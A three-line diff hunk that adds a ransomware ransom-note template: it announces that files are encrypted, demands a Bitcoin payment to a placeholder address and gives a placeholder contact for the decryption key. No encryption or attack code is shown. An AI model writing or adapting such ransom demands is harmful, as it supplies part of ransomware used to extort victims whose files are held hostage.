@@ -1,0 +1,3 @@
+Your files have been encrypted!
+To decrypt them, you must pay 0.xx BTC to the following address: %s
+Send proof of payment to %s or hakers contact  for the decryption key.
